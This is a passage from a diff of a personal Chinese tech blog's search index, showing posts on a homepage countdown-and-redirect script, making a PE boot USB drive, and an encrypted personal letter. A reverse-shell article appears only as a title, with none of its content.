intervalId = <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">        count--;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"countdown"</span>).<span class="property">innerHTML</span> = count; <span class="comment">// 更新倒计时数字</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (count &lt;= <span class="number">0</span>) {</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">clearInterval</span>(intervalId); <span class="comment">// 清除计时器</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"countdown-text"</span>).<span class="property">innerHTML</span> = <span class="string">"欢迎访问ANINEG的小屋"</span>; <span class="comment">// 替换倒计时提示为“欢迎访问”</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">"https://blog.anineg.space/"</span>; <span class="comment">// 跳转到下一个页面</span></span></span><br><span class="line"><span class="language-javascript">        }</span></span><br><span class="line"><span class="language-javascript">    }, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">"click"</span>, <span class="keyword">function</span>(<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">        <span class="built_in">clearInterval</span>(intervalId); <span class="comment">// 清除计时器</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"countdown-text"</span>).<span class="property">innerHTML</span> = <span class="string">"欢迎访问ANINEG的小屋"</span>; <span class="comment">// 替换倒计时提示为“欢迎访问”</span></span></span><br><span class="line"><span class="language-javascript">    });</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"countdown-text"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"countdown"</span>&gt;</span>13<span class="tag">&lt;/<span class="name">span</span>&gt;</span> 秒后自动前往博客页···<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
-<p>实际上，该模板的入场动画大概耗费3秒左右，因此需要10秒自动跳转的效果就需要将预设调为13秒。</p>
-<p>在预加载部分，在倒计时开始时，使用JavaScript动态创建一个<code>&lt;iframe&gt;</code>元素，并将需要预加载的页面设置为该<code>&lt;iframe&gt;</code>的<code>src</code>属性。这样，浏览器就会在倒计时期间开始预加载该页面，从而提高用户体验。</p>
-<p>接着，我们创建了一个计时器，每秒减少计数器变量<code>count</code>的值，并更新页面上的倒计时数字。当<code>count</code>的值减少到0时，清除计时器并跳转到下一个页面。最后，在页面上添加了一个事件监听器，当用户单击页面上的任何位置时，清除计时器，停止倒计时。</p>
-<p>最后，我们在页面中添加了一个<code>&lt;p&gt;</code>元素，并将其<code>id</code>属性设置为<code>"countdown-text"</code>，用于显示倒计时提示或替换后的新文本。在计时器停止时，我们使用JavaScript修改了该元素的文本内容，将倒计时提示替换为需要显示的新文本。同时在单击事件监听器中补充添加了一行代码，用于在停止计时器时替换倒计时提示为“欢迎访问”文本。这样，无论是计时器正常结束还是被单击事件停止，都会显示“欢迎访问”文本。</p>
+<p><img src="https://img.anineg.space//202203121319518.png" alt="图片1"></p>
+<center>优启通官网</center>
+<details class="folding-tag" cyan="" open=""><summary> 制作工具下载链接： </summary>
+              <div class="content">
+              <div class="tag link"><a class="link-card" title="百度云(密码:txna)" href="https://pan.baidu.com/share/init?surl=Gh20ukCe973YuMs6D84SuQ"><div class="left"><img src="https://img.anineg.space//202203121335021.png"></div><div class="right"><p class="text">百度云(密码:txna)</p><p class="url">https://pan.baidu.com/share/init?surl=Gh20ukCe973YuMs6D84SuQ</p></div></a></div>
+              </div>
+            </details>
+<h1>制作启动盘</h1>
+<ul>
+<li>下载完成后，解压，运行exe文件。选择需要制作的U盘，同时可以选择为PE系统添加自己喜欢的壁纸。</li>
+</ul>
+<p><img src="https://img.anineg.space//202203121321357.png" alt="图片2"></p>
+<center>制作界面</center>
+<h1>运行启动盘</h1>
+<ul>
+<li>在这里我使用VM虚拟机运行PE系统，若需要实机运行，请参考教程：</li>
+</ul>
+<details class="folding-tag"><summary> 电脑设置u盘启动的方法 </summary>
+              <div class="content">
+              <div class="tag link"><a class="link-card" title="CSDN" href="https://blog.csdn.net/qq_29508575/article/details/121907625?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164706370216780271515153%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164706370216780271515153&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-121907625.article_score_rank&amp;utm_term=u%E7%9B%98%E5%90%AF%E5%8A%A8&amp;spm=1018.2226.3001.4187"><div class="left"><img src="https://s2.loli.net/2022/02/17/K6VzyT4a71xntAU.png"></div><div class="right"><p class="text">CSDN</p><p class="url">https://blog.csdn.net/qq_29508575/article/details/121907625?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164706370216780271515153%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164706370216780271515153&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-121907625.article_score_rank&amp;utm_term=u%E7%9B%98%E5%90%AF%E5%8A%A8&amp;spm=1018.2226.3001.4187</p></div></a></div>
+              </div>
+            </details>
+<p>在虚拟机测试运行PE系统，进Boot，选择U盘启动。</p>
+<p><img src="https://img.anineg.space//202203121323385.png" alt="图片3"></p>
+<ul>
+<li>提供了两种系统，两种默认分辨率选择。</li>
+</ul>
+<p><img src="https://img.anineg.space//202203121325358.png" alt="图片4"></p>
+<ul>
+<li>进入PE系统桌面。</li>
+</ul>
+<p><img src="https://img.anineg.space//202203121326465.png" alt="图片5"></p>
+<ul>
+<li>PE系统的资源管理器</li>
+</ul>
+<p><img src="https://img.anineg.space//202203121327257.png" alt="图片6"></p>
+<ul>
+<li>DiskGenius软件PE版，可以对磁盘进行修改备份修复等。</li>
+</ul>
+<p><img src="https://img.anineg.space//202203121328507.png" alt="图片7"></p>
+<ul>
+<li>PE系统还提供了大量工具。</li>
+</ul>
+<p><img src="https://img.anineg.space//202203121328423.png" alt="图片8"></p>
 ]]></content>
       <categories>
-        <category>随手记</category>
+        <category>学习笔记</category>
       </categories>
-      <tags>
-        <tag>源码</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>某神奇社团的招新视频~</title>
-    <url>/2022/07/29/ladybug/</url>
-    <content><![CDATA[<div class="tip "><p>Tips：如有背景音乐自动播放，可以在左下角弹窗内关闭。</p>
-</div>
-<div align="center" class="aspect-ratio">
-    <iframe src="https://player.bilibili.com/player.html?aid=216487398&amp;&amp;page=1&amp;as_wide=1&amp;high_quality=1&amp;danmaku=0" scrolling="no" border="0" frameborder="no" framespacing="0" high_quality="1" danmaku="1" allowfullscreen="true"> 
-    </iframe>
-</div>
-]]></content>
-      <categories>
-        <category>视频</category>
-      </categories>
-      <tags>
-        <tag>bilibili</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2022/9/10，来自广西桂林</title>
-    <url>/2022/09/10/letter1/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="3612f1381621152f5e83954bfcca716232f4473547a194423d62246bf5d3c2e3">79a05bc0503f79b89e0f5d9d72ac9997b09e5d0a25b18f16a09e58ce90dc1e21bb01420021ea6a43e142f7c9163160abf3a14d91734cdb8328d6d609ad5106e899e44c5692ce09afdbd4a329ea905b3ff8efdf03c9a12c5e974c6788d974f481c8dfb7cecd22e3ff945df573b6e37de1818df9a7ca812010c51f53a2f4d2ba689f900e10248e3efbcca1fdbfbbbea5497f025ad24be869a03732a72eddaac9e1536442db45699077aac43b10098af845d025eca6d135ca90ccffb2d96ef163357c8be346e663527a27ccbe490d446202cffa3906b25b09dbfe791af5e2736436629f7ff154b8352b53d65bf81ebc290938a8788107779cb258ab9a3e16cfb9e9dc29e768892fbdfa4a3faa7bb53d2e73a6f0ec0325360034c0d6888ae532558bf1c5a0adaf6a0410a1c6eea5f19689e0b649b36ae8bb45a492722030005b891ca559b21f2df4be6956ec14d053eb01fef087b4d6ec47f49fddcffbd3cb9a23293a2274fe4898ce828596ec2dae4799e2eb244ca9665fd9e2eb0c80108fe2e94c62fbf4d702ecc9ffd64cff3e2521717f3c508a1d868e62a414d797f0266f11c9bb1494684f7d6949e7da49d26b459c5a777877d30ce73d74524d8b65394b1c27495f79a77dc925046d3e1260028c629563289e2afd126478ffdec62a75f47160fa4529d272d329235779b1e23976a5f02b969ae5a2033950dee01f10d308a87c2cf38c59c754e003137ed55799dca1b7a87033c2626f58bf80a1262d1832943a01c83438ff626a2f9cdc0f8f1362ee38f9b22dbca9c00912fb67f3f830cab682bb8d14bd1cab59532da704238747a41b448ffe507002591352bb8556c8e31530fff8bf46274c6863e6e766b2c1ea9c37073f715afa7219ee893a0ee24805e0f3d2d84561f6768a6c6a9380dc79f42a8c7bfa8ee97cbe214cbc89fea30858b59258e0cf185ae53651f518b61ccb33f2d36ec7816ec7cbf5ed95380983f322ec10560e30bf2f305ceef0d9fe27a79c37a0f8b30420329f7f78b1f1fb6a92f4bbbe5ea0dae8cd2fbbd06db4c76ea64309392ef1d419148a931693f4a40bc2bd14078810ae757711932d7655a68743291da34439bbb0d07790480c8d6c96c5d7a231a58374ba830e17ad744d8f0c29bbba0a1193a95ab7e8192924e1dbadb11a97272b9c4473715f2934064964d27f15041a975b5e6010b9d5a1c72159ab26533a2cca792d49a3ff1e0af95de21753df4956e0d4da8d89d69d3c922d20ccf456de4f4ecd5dcf365e6740d69a57d333cdf2e24e47982ec24554b6637e55b06a11e4506f93a888605326d03cbef50d07273859432ac978d25df9fb6f615847611afdb2ad528c797d85a77fbf16a847606975ae85e2492604dc48cf98c71b66176ac5d0eb8628ef5c6442f0e830b7060adf88521b362f8285a3b2ed381f50326cf0878caa176f049ab8ea52f5c68fd5a2118fac38621a6fefb5afa9d247b79750545fa2d2816d10ba765db26254b88c6c4b026531177ba49dbcd2eab7411d7a0b028c6ab3c0e3e4a9e39e40ec5b7b383ec6a6df3d73cd96d915f27526d2c9600e2163b398397e40fe4d31d52cf3dd46e90ce430b01ed5b04c5ff4c96e8da9532324131bfe7fb44875e7c42e7e770cad9f07c7715f1a48443ba033a4926c63bba0e6a1322cc29080b2119043828418a7141192c9bb1784d841b0471cc81d587a05ecf85b2321c53d8014ff43353be47301c6219eafc8d7e8e96b3a684cfba8397f294b9aa8bfe95f1f7cab0a142f91c16503bd062bbc10066696fe160f83834c3ceadac41b9b50601ba165adc6f18bde84ad778087557501649bfbc8e03c1e46123e3d8aca7a95de4fa8ec748887a37bce9835abf78258621f836ceb76972ef9f4b762a3fae7598d67f4c6b0a0a4966a3bd64909683bed79917994526f736ae090a44ada2cd051d2c10bce68ea104455d00b4a130df54388d9ec058eeb57925040dc5bb988257e6b1eaa3798b615d0d07dbea21b294e64fb2ecb9201d0754f208399f56c13483e54bfe65801156b459ed62855c37d0d89ae42498716d8b787066dbdeabdadd8088cac1aa8d92088bfc1dd0aa62cabd6c08de52aac12d9ccb8751cbed21630a883ad7d0627bdd332856bc7a0e4a6b712740b9344b0db85e0942be4309dc8790f873f743f6116b94c5340d598802565acb63d41a95377f8c85b11e2c709af5a081e76c139252aa7d25af53e2f9a5382b67c008c4eed0cc66c7975e9ba0b4d6175b5c01109e0b4253c93e1a312fc99405885e3db98a3abdfdb7e74db4fcdc7fd3b3fda8c81aba3582e9d9a3055aac44134caeaefbeb3c6ce2a29f353f5069fdd7e70bc1348dd31c605e1a2f76b9100d96ec34a5b3b677ce3e86dcfb867366948921ff89a6b47ab40be4d28950d68be0c29976e47b6c1e411afa47b7d7b6264eb73aa01174915b0e94bdf16af8132defc29f0faf9bba3c0dfea698ccde7e7c7ec624923eb5c4a75e65661756548ee0a2044f5b0955e80862953e23c5bd6233dcd08c76a6ef7812b1725dedadb7cc928ee460ecf01dd1b68813919eebc7a5337f869f0e5d7662cc6592f3df22288141d0d8c3e47c715985a9cc8487d243832f702fc20c5f9bcfba36db021458fd0168fd99f8238c70e7bbd9d3c8f498f5fba182e65006573fbc13588f852bb5e1f175c5299cdf33ff67642366f6c30e928aa913ece10bd7cf9cbcb274b0847baf9dc11425820656dd30e8ade33fa20c3a084cba1f3cf1e97f278d4c3dcd07dc417745807273d30a28b53fcd0aff08a0b134bda45a9914cf4f966e66dce8a3c51db6a9cbdb29ec3da6d1dc6a77baedab94a41fe3c6df2b1ff0c3a4d701a5f7cca201b2d08f4e42d168c653d6493a9639b60105c759781821d0cc645ce608a7a04b033dc3a74042a816cbdddd587de09f63233fae0aaea83016368c91a7d13f226d3ba937537f58e7d70832c88e0ac4759d5c6910f80bae1fdf26910815f5c88220f8d2f5d2f3f88faf0ad61a0c6c686d8e20d30420d7110b18ea46e6cf6d2abc1357f622c8a6de764953d30fc0400adacc0ba719a35d8892b63ca329720b1145367ef27486597bd798e4cd19baaa86313b56f34273e8d304ca8e4e644483ec5b3d337a367a8a0494b7ec07d8d6eb0459c3feae774d125cc76e68dd097872f58b52f7af4616d2b805bd899e54fb046e5ff16c6cb3e612c246189b2bb42d75b7829fa03e17afcd69d2acbe41ec56eafc4594c8a5fd1c0bc15410e4c4f16c7ec987dccbdd249f09e0169b0dc2bcb15a0a862fda4ba0bfafcbe340afc36dc45df19c5c93838e51a1583df9649591f24307768b0c172eb7a717f0a19d79aa969ef613e8d8d439a5fa030ebea5c6cdbd99df136ae33c3bf004111d0f4cfebd557d8566269cfaaf48f8ced873a92726fdc385c3571af73cce4eec8ee8d1f9a64fb58399d5669363452336dee2da3d6a58448c67dc9f33ad4ca0b4a06fdfbc5b9c6902b6ac95b03ea7745750f56099fac3c0de01bafc922b323225d2f84c21fa18bf2e534bfc9b1f62288fd5841ef0ae81f1807e7a0702b74909553cf8ae6b8448a4ec2faf974444509a94951878f0f67a9ecd9aaf0ba183e003ac5601756c2cd608c84d9dea90e225ce8d66e95e0f4d24b1afa83c4a783faca8b96233168faabd75a61b1569f489da3aa219d536f95658f2743ca1b8719</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-up">
-      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-up">加密文章，密码在明信片上哦</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
   </entry>
   <entry>
     <title>反弹Shell:通过Excel表格进行远控</title>
@@ -1130,60 +1136,54 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
       </tags>
   </entry>
   <entry>
-    <title>PE启动盘的制作</title>
-    <url>/2022/03/12/pe/</url>
-    <content><![CDATA[<h1>下载制作工具</h1>
+    <title>2022/9/10，来自广西桂林</title>
+    <url>/2022/09/10/letter1/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="3612f1381621152f5e83954bfcca716232f4473547a194423d62246bf5d3c2e3">79a05bc0503f79b89e0f5d9d72ac9997b09e5d0a25b18f16a09e58ce90dc1e21bb01420021ea6a43e142f7c9163160abf3a14d91734cdb8328d6d609ad5106e899e44c5692ce09afdbd4a329ea905b3ff8efdf03c9a12c5e974c6788d974f481c8dfb7cecd22e3ff945df573b6e37de1818df9a7ca812010c51f53a2f4d2ba689f900e10248e3efbcca1fdbfbbbea5497f025ad24be869a03732a72eddaac9e1536442db45699077aac43b10098af845d025eca6d135ca90ccffb2d96ef163357c8be346e663527a27ccbe490d446202cffa3906b25b09dbfe791af5e2736436629f7ff154b8352b53d65bf81ebc290938a8788107779cb258ab9a3e16cfb9e9dc29e768892fbdfa4a3faa7bb53d2e73a6f0ec0325360034c0d6888ae532558bf1c5a0adaf6a0410a1c6eea5f19689e0b649b36ae8bb45a492722030005b891ca559b21f2df4be6956ec14d053eb01fef087b4d6ec47f49fddcffbd3cb9a23293a2274fe4898ce828596ec2dae4799e2eb244ca9665fd9e2eb0c80108fe2e94c62fbf4d702ecc9ffd64cff3e2521717f3c508a1d868e62a414d797f0266f11c9bb1494684f7d6949e7da49d26b459c5a777877d30ce73d74524d8b65394b1c27495f79a77dc925046d3e1260028c629563289e2afd126478ffdec62a75f47160fa4529d272d329235779b1e23976a5f02b969ae5a2033950dee01f10d308a87c2cf38c59c754e003137ed55799dca1b7a87033c2626f58bf80a1262d1832943a01c83438ff626a2f9cdc0f8f1362ee38f9b22dbca9c00912fb67f3f830cab682bb8d14bd1cab59532da704238747a41b448ffe507002591352bb8556c8e31530fff8bf46274c6863e6e766b2c1ea9c37073f715afa7219ee893a0ee24805e0f3d2d84561f6768a6c6a9380dc79f42a8c7bfa8ee97cbe214cbc89fea30858b59258e0cf185ae53651f518b61ccb33f2d36ec7816ec7cbf5ed95380983f322ec10560e30bf2f305ceef0d9fe27a79c37a0f8b30420329f7f78b1f1fb6a92f4bbbe5ea0dae8cd2fbbd06db4c76ea64309392ef1d419148a931693f4a40bc2bd14078810ae757711932d7655a68743291da34439bbb0d07790480c8d6c96c5d7a231a58374ba830e17ad744d8f0c29bbba0a1193a95ab7e8192924e1dbadb11a97272b9c4473715f2934064964d27f15041a975b5e6010b9d5a1c72159ab26533a2cca792d49a3ff1e0af95de21753df4956e0d4da8d89d69d3c922d20ccf456de4f4ecd5dcf365e6740d69a57d333cdf2e24e47982ec24554b6637e55b06a11e4506f93a888605326d03cbef50d07273859432ac978d25df9fb6f615847611afdb2ad528c797d85a77fbf16a847606975ae85e2492604dc48cf98c71b66176ac5d0eb8628ef5c6442f0e830b7060adf88521b362f8285a3b2ed381f50326cf0878caa176f049ab8ea52f5c68fd5a2118fac38621a6fefb5afa9d247b79750545fa2d2816d10ba765db26254b88c6c4b026531177ba49dbcd2eab7411d7a0b028c6ab3c0e3e4a9e39e40ec5b7b383ec6a6df3d73cd96d915f27526d2c9600e2163b398397e40fe4d31d52cf3dd46e90ce430b01ed5b04c5ff4c96e8da9532324131bfe7fb44875e7c42e7e770cad9f07c7715f1a48443ba033a4926c63bba0e6a1322cc29080b2119043828418a7141192c9bb1784d841b0471cc81d587a05ecf85b2321c53d8014ff43353be47301c6219eafc8d7e8e96b3a684cfba8397f294b9aa8bfe95f1f7cab0a142f91c16503bd062bbc10066696fe160f83834c3ceadac41b9b50601ba165adc6f18bde84ad778087557501649bfbc8e03c1e46123e3d8aca7a95de4fa8ec748887a37bce9835abf78258621f836ceb76972ef9f4b762a3fae7598d67f4c6b0a0a4966a3bd64909683bed79917994526f736ae090a44ada2cd051d2c10bce68ea104455d00b4a130df54388d9ec058eeb57925040dc5bb988257e6b1eaa3798b615d0d07dbea21b294e64fb2ecb9201d0754f208399f56c13483e54bfe65801156b459ed62855c37d0d89ae42498716d8b787066dbdeabdadd8088cac1aa8d92088bfc1dd0aa62cabd6c08de52aac12d9ccb8751cbed21630a883ad7d0627bdd332856bc7a0e4a6b712740b9344b0db85e0942be4309dc8790f873f743f6116b94c5340d598802565acb63d41a95377f8c85b11e2c709af5a081e76c139252aa7d25af53e2f9a5382b67c008c4eed0cc66c7975e9ba0b4d6175b5c01109e0b4253c93e1a312fc99405885e3db98a3abdfdb7e74db4fcdc7fd3b3fda8c81aba3582e9d9a3055aac44134caeaefbeb3c6ce2a29f353f5069fdd7e70bc1348dd31c605e1a2f76b9100d96ec34a5b3b677ce3e86dcfb867366948921ff89a6b47ab40be4d28950d68be0c29976e47b6c1e411afa47b7d7b6264eb73aa01174915b0e94bdf16af8132defc29f0faf9bba3c0dfea698ccde7e7c7ec624923eb5c4a75e65661756548ee0a2044f5b0955e80862953e23c5bd6233dcd08c76a6ef7812b1725dedadb7cc928ee460ecf01dd1b68813919eebc7a5337f869f0e5d7662cc6592f3df22288141d0d8c3e47c715985a9cc8487d243832f702fc20c5f9bcfba36db021458fd0168fd99f8238c70e7bbd9d3c8f498f5fba182e65006573fbc13588f852bb5e1f175c5299cdf33ff67642366f6c30e928aa913ece10bd7cf9cbcb274b0847baf9dc11425820656dd30e8ade33fa20c3a084cba1f3cf1e97f278d4c3dcd07dc417745807273d30a28b53fcd0aff08a0b134bda45a9914cf4f966e66dce8a3c51db6a9cbdb29ec3da6d1dc6a77baedab94a41fe3c6df2b1ff0c3a4d701a5f7cca201b2d08f4e42d168c653d6493a9639b60105c759781821d0cc645ce608a7a04b033dc3a74042a816cbdddd587de09f63233fae0aaea83016368c91a7d13f226d3ba937537f58e7d70832c88e0ac4759d5c6910f80bae1fdf26910815f5c88220f8d2f5d2f3f88faf0ad61a0c6c686d8e20d30420d7110b18ea46e6cf6d2abc1357f622c8a6de764953d30fc0400adacc0ba719a35d8892b63ca329720b1145367ef27486597bd798e4cd19baaa86313b56f34273e8d304ca8e4e644483ec5b3d337a367a8a0494b7ec07d8d6eb0459c3feae774d125cc76e68dd097872f58b52f7af4616d2b805bd899e54fb046e5ff16c6cb3e612c246189b2bb42d75b7829fa03e17afcd69d2acbe41ec56eafc4594c8a5fd1c0bc15410e4c4f16c7ec987dccbdd249f09e0169b0dc2bcb15a0a862fda4ba0bfafcbe340afc36dc45df19c5c93838e51a1583df9649591f24307768b0c172eb7a717f0a19d79aa969ef613e8d8d439a5fa030ebea5c6cdbd99df136ae33c3bf004111d0f4cfebd557d8566269cfaaf48f8ced873a92726fdc385c3571af73cce4eec8ee8d1f9a64fb58399d5669363452336dee2da3d6a58448c67dc9f33ad4ca0b4a06fdfbc5b9c6902b6ac95b03ea7745750f56099fac3c0de01bafc922b323225d2f84c21fa18bf2e534bfc9b1f62288fd5841ef0ae81f1807e7a0702b74909553cf8ae6b8448a4ec2faf974444509a94951878f0f67a9ecd9aaf0ba183e003ac5601756c2cd608c84d9dea90e225ce8d66e95e0f4d24b1afa83c4a783faca8b96233168faabd75a61b1569f489da3aa219d536f95658f2743ca1b8719</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-up">
+      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-up">加密文章，密码在明信片上哦</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+  </entry>
+  <entry>
+    <title>主页源码修改记录（简单网页倒计时+跳转+文本替换）</title>
+    <url>/2023/04/14/indexcode/</url>
+    <content><![CDATA[<h1>网站模板</h1>
+<p>我的主页<a href="https://anineg.space/">ANINEGの小屋</a>模板是使用的来自<a href="https://html5up.net/">https://html5up.net</a>的免费模板，以下是网页的介绍：</p>
 <ul>
-<li>制作启动盘推荐使用<a href="https://www.upe.net/">优启通</a>，相对<s>大白菜，老毛桃</s>等工具而言相当简洁干净，不会对通过启动盘安装的系统安装预装软件。</li>
+<li>Fully <strong>Responsive</strong></li>
+<li>Built on intelligent <strong>HTML5 + CSS3</strong></li>
+<li>Super <strong>Customizable</strong></li>
+<li><strong>100% Free</strong> under the <a href="https://html5up.net/license">Creative Commons</a></li>
 </ul>
-<p><img src="https://img.anineg.space//202203121319518.png" alt="图片1"></p>
-<center>优启通官网</center>
-<details class="folding-tag" cyan="" open=""><summary> 制作工具下载链接： </summary>
-              <div class="content">
-              <div class="tag link"><a class="link-card" title="百度云(密码:txna)" href="https://pan.baidu.com/share/init?surl=Gh20ukCe973YuMs6D84SuQ"><div class="left"><img src="https://img.anineg.space//202203121335021.png"></div><div class="right"><p class="text">百度云(密码:txna)</p><p class="url">https://pan.baidu.com/share/init?surl=Gh20ukCe973YuMs6D84SuQ</p></div></a></div>
-              </div>
-            </details>
-<h1>制作启动盘</h1>
-<ul>
-<li>下载完成后，解压，运行exe文件。选择需要制作的U盘，同时可以选择为PE系统添加自己喜欢的壁纸。</li>
-</ul>
-<p><img src="https://img.anineg.space//202203121321357.png" alt="图片2"></p>
-<center>制作界面</center>
-<h1>运行启动盘</h1>
-<ul>
-<li>在这里我使用VM虚拟机运行PE系统，若需要实机运行，请参考教程：</li>
-</ul>
-<details class="folding-tag"><summary> 电脑设置u盘启动的方法 </summary>
-              <div class="content">
-              <div class="tag link"><a class="link-card" title="CSDN" href="https://blog.csdn.net/qq_29508575/article/details/121907625?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164706370216780271515153%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164706370216780271515153&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-121907625.article_score_rank&amp;utm_term=u%E7%9B%98%E5%90%AF%E5%8A%A8&amp;spm=1018.2226.3001.4187"><div class="left"><img src="https://s2.loli.net/2022/02/17/K6VzyT4a71xntAU.png"></div><div class="right"><p class="text">CSDN</p><p class="url">https://blog.csdn.net/qq_29508575/article/details/121907625?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164706370216780271515153%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164706370216780271515153&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-121907625.article_score_rank&amp;utm_term=u%E7%9B%98%E5%90%AF%E5%8A%A8&amp;spm=1018.2226.3001.4187</p></div></a></div>
-              </div>
-            </details>
-<p>在虚拟机测试运行PE系统，进Boot，选择U盘启动。</p>
-<p><img src="https://img.anineg.space//202203121323385.png" alt="图片3"></p>
-<ul>
-<li>提供了两种系统，两种默认分辨率选择。</li>
-</ul>
-<p><img src="https://img.anineg.space//202203121325358.png" alt="图片4"></p>
-<ul>
-<li>进入PE系统桌面。</li>
-</ul>
-<p><img src="https://img.anineg.space//202203121326465.png" alt="图片5"></p>
-<ul>
-<li>PE系统的资源管理器</li>
-</ul>
-<p><img src="https://img.anineg.space//202203121327257.png" alt="图片6"></p>
-<ul>
-<li>DiskGenius软件PE版，可以对磁盘进行修改备份修复等。</li>
-</ul>
-<p><img src="https://img.anineg.space//202203121328507.png" alt="图片7"></p>
-<ul>
-<li>PE系统还提供了大量工具。</li>
-</ul>
-<p><img src="https://img.anineg.space//202203121328423.png" alt="图片8"></p>
+<p>有需要的同学们可以去自行下载。</p>
+<p><img src="https://img.anineg.space/myindex.png" alt=""></p>
+<h1>源码修改</h1>
+<p>在原有模板的基础上，我增添了如下功能：</p>
+<ol>
+<li>它会在页面上显示10秒倒计时，结束后后自动跳转到博客页。</li>
+<li>在倒计时这10秒中可以对博客网页进行预加载。</li>
+<li>当用户单击网页任何位置时，倒计时停止，并将显示倒计时的文本替换为“欢迎访问ANINEG的小屋”</li>
+</ol>
+<p>以下是实现过程：</p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> preloadUrl = <span class="string">"https://blog.anineg.space/"</span>; <span class="comment">// 需要预加载的页面地址</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">"iframe"</span>); <span class="comment">// 创建一个iframe元素</span></span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">style</span>.<span class="property">display</span> = <span class="string">"none"</span>; <span class="comment">// 将iframe元素隐藏</span></span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">src</span> = preloadUrl; <span class="comment">// 设置预加载页面的地址</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe); <span class="comment">// 将iframe元素添加到body中，开始预加载</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> count = <span class="number">13</span>; <span class="comment">// 设置倒计时时间</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> intervalId = <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">        count--;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"countdown"</span>).<span class="property">innerHTML</span> = count; <span class="comment">// 更新倒计时数字</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (count &lt;= <span class="number">0</span>) {</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">clearInterval</span>(intervalId); <span class="comment">// 清除计时器</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"countdown-text"</span>).<span class="property">innerHTML</span> = <span class="string">"欢迎访问ANINEG的小屋"</span>; <span class="comment">// 替换倒计时提示为“欢迎访问”</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">location</span>.<span 